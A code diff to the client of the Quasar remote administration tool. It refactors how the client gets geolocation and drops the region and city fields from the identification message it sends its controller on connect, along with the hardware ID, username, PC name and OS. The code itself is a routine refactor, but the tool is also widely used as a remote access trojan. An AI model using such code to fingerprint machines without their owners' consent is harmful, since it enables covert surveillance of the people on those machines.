@@ -1,6 +1,7 @@
 ﻿using Quasar.Client.Commands;
 using Quasar.Client.Config;
 using Quasar.Client.Data;
+using Quasar.Client.IpGeoLocation;
 using Quasar.Client.Helper;
 using Quasar.Client.Utilities;
 using Quasar.Common.Helpers;
@@ -96,18 +97,16 @@ namespace Quasar.Client.Networking
             {
                 // send client identification once connected
 
-                GeoLocationHelper.Initialize();
+                var geoInfo = GeoInformationFactory.GetGeoInformation();
 
                 client.Send(new ClientIdentification
                 {
                     Version = Settings.VERSION,
                     OperatingSystem = PlatformHelper.FullName,
                     AccountType = WindowsAccountHelper.GetAccountType(),
-                    Country = GeoLocationHelper.GeoInfo.Country,
-                    CountryCode = GeoLocationHelper.GeoInfo.CountryCode,
-                    Region = GeoLocationHelper.GeoInfo.Region,
-                    City = GeoLocationHelper.GeoInfo.City,
-                    ImageIndex = GeoLocationHelper.ImageIndex,
+                    Country = geoInfo.Country,
+                    CountryCode = geoInfo.CountryCode,
+                    ImageIndex = geoInfo.ImageIndex,
                     Id = DevicesHelper.HardwareId,
                     Username = WindowsAccountHelper.GetName(),
                     PcName = SystemHelper.GetPcName(),
